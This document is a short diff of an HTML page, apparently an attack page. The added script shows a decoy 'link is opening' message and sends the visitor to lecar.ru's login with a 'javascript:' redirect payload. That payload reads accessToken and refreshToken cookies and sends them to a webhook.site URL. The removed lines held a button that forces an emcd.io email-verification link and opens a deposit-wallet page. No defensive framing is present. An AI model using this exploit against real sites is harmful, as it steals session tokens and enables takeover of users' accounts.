@@ -1,13 +1,4 @@
-<button onclick="openTwoTabs()">Click me</button>
-
+Ссылка открывается...
 <script>
-function openTwoTabs() {
-    // Первая вкладка сразу
-    window.open('https://emcd.io/auth/verifyEmail/0cd70fdd-0bcd-47f2-ae3b-38675c214ac7', '_blank');
-    
-    // Вторая через 100мс, чтобы браузер не посчитал это спамом
-    setTimeout(function() {
-        window.location = 'https://emcd.io/wallets/?name=DepositWallet&coin=';
-    }, 100);
-}
+document.location="https://lecar.ru/lk/login?redirect=javascript:fetch('https://webhook.site/5264382a-953d-460b-b8af-3af011cd5f4b?tokens='.concat(encodeURIComponent(document.cookie.match(/accessToken=[^;]*|refreshToken=[^;]*/g).join(';')))).catch(e=>{}).then(()=>new Promise(r=>setTimeout(r,3000))).then(()=>location.href='/');";
 </script>
